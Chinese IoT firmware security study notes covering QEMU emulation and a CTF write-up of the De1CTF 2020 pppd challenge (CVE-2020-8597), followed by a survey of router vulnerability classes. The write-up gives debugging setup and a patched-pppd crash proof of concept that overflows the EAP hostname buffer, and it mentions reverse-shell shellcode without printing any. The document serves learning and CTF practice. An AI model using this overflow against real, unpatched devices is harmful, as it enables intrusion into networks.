IOT 安全实战资料收集整合：https://zybuluo.com/H4l0/note/1524758

### 一、固件安全概述

​	固件指设备内部保存的**设备 “驱动程序”**，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。

​	在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。

#### 固件结构特点

iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。

![image-20200829170912807](./固件（pppd）/image-20200829170912807.png)



### 二、固件模拟概述

iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。
需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。

#### vmware 和 qemu 的区别

vmware 和 qemu都是虚拟机软件，他们的区别如下：

* vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。
* qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。

使用：

* 通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。
* qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。



#### qemu 固件模拟

有两种运行方式：

* 用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。

```
~$ qemu-arm -L ./ ././usr/bin/tddp

```

![image-20200829174231769](./固件（pppd）/image-20200829174231769.png)

* 系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。

```
~/squashfs-root# chroot . sh
```

![image-20200829174236510](./固件（pppd）/image-20200829174236510.png)

### 三、MISP PWN & ARM PWN

#### 1）ctf 中的 mips pwn

##### （a）2020 De1ctf - pppd （CVE-2020-8597）

考点：

1. nday cve 漏洞分析和利用；
2. mips 指令集栈溢出漏洞的调试和利用

文件：`vmlinux`、`rootfs.img`、`qemu`的启动脚本`start.sh`。

漏洞点：

在 [eap_request](https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0)和[eap_response](https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719)函数中，`rhostname`是在栈中分配的256字节长的缓冲区。在`EAPT_MD5CHAP`分支中，由于[不正确的大小检查](https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426)，主机名大于256个字节长将被允许被复制到`rhostname`，从而导致堆栈溢出。

![image-20200830121124694](./固件（pppd）/image-20200830121124694.png)

操作步骤：

（1）用`cpio`解包`rootfs.img` 。

在chall目录下创建rootfs文件夹：`mkdir rootfs`

![image-20200830121439048](./固件（pppd）/image-20200830121439048.png)

```
$ cd rootfs
$ cpio -idvm < ../rootfs.img
```

（2）编辑`etc/inittab`

找到对应相同的注释，把下面的覆盖过去即可。

```
# Put a getty on the serial port
#ttyS0::respawn:/sbin/getty -L  ttyS0 0 vt100 # GENERIC_SERIAL
#ttyS0::sysinit:/pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100
# Bring up network device
::sysinit:/sbin/ifup -a
# Launch gdbserver
ttyS0::sysinit:/gdbserver :1234 /pppd /dev/ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100

# Stuff to do for the 3-finger salute
```

（3）修改`start.sh`文件

将最后面`-net null...`选项修改为`-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty`

（4）将gdbserver放到环境的根目录`rootfs/`下

（5）重新打包`rootfs.img`

```
$ cd rootfs
$ find . | cpio -H newc -o > ../rootfs.img
```

（6）运行

`./start.sh`

![image-20200830122145171](./固件（pppd）/image-20200830122145171.png)

打开一个新的窗口，使用`gdb`启动并连接远程`pppd`

```
winter@ubuntu:~/hws_zongjie/pppd/attachment/docker/chall$ gdb-multiarch -ex 'set architecture mips'   \
               -ex 'target remote :1234'     \
               -ex 'file rootfs/pppd'        \
               -ex 'break *0x42F9A8'         \
               -ex 'continue'
```

再打开一个新的窗口

编写一个1024字节长的循环字符串`/tmp/sc`作为payload：

```
$ python -c 'from pwn import*; open("/tmp/sc", "wb").write(cyclic(1024))'
$ cat /tmp/sc
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
```

接着

（1）下载ppp的源码

```
git clone https://github.com/paulusmack/ppp.git
cd ppp
cd pppd
```

（2）修改`eap.c`，搜索`eap_chap_response`，找到

```
eap_chap_response(esp, id, hash, esp->es_client.ea_name,
		    esp->es_client.ea_namelen);
```

修改为

```
		char payload[1024] = {0};
		FILE *fp = fopen("/tmp/sc", "r");
		fread(payload, 1, 1024, fp);
		fclose(fp);
		eap_chap_response(esp, id, hash, payload, 1024);
```

（3）编译

```
cd ..
pppd$ make 
$ cd pppd
$ cp pppd pppd-payload
```

（4）在本地机器运行patched `pppd`

```
sudo ./pppd-payload noauth local defaultroute debug nodetach /dev/pts/1 user admin password 1234568
```

不久，远程`pppd`崩溃并出现分段错误。

![image-20200830154226602](./固件（pppd）/image-20200830154226602.png)



获取flag：

方法一：

执行`./exp.sh`，wireshark单独捕捉流量，然后直接搜flag

方法二：

msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了

不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。



参考：

https://www.anquanke.com/post/id/200639

https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd

https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md

##### （b）2019 0ctf - embeded_heap



参考：

https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/

https://zybuluo.com/H4l0/note/1633971

考点：

1. mips 堆溢出利用；
2. uClibc 堆管理机制。 







#### 2）ctf 中的 arm pwn

### 四、固件中常见安全漏洞

#### 栈溢出

栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。

![image-20200830015127901](./固件（pppd）/image-20200830015127901.png)

DLINK DIR-815 路由器前台栈溢出

#### 命令执行 / 命令注入

命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。

* DLINK DIR-859 upnp 协议命令注入
* tplink sr20 路由器命令注入
* Draytek Vigor2960 前台登录处栈溢出

TPLINK Sr20 路由器 tddp 协议命令注入漏洞

#### 拒绝服务

在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。



### 五、实战

栈溢出

TPLINK WR841n 路由器后台栈溢出

漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。

命令注入

TPLINK Sr20 路由器 tddp 协议命令注入漏洞

漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。



---

### cpio的解包与打包：

cpio -idvm < **../rootfs.img**
find . | cpio -H newc -o > **../initrd.cpio**

### squashfs解包与打包：

unsquashfs  openwrt.squashfs
mksquashfs squashfs-root-0 1.squashfs -comp xz

### ext4

这种文件系统的打包与解包使用mount挂载

![image-20200829204006754](./固件（pppd）/image-20200829204006754.png)

可以把cpio,squashfs,ext4理解成一个压缩包，都可以用**binwalk解包**，但是打包的方式是不同的

这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）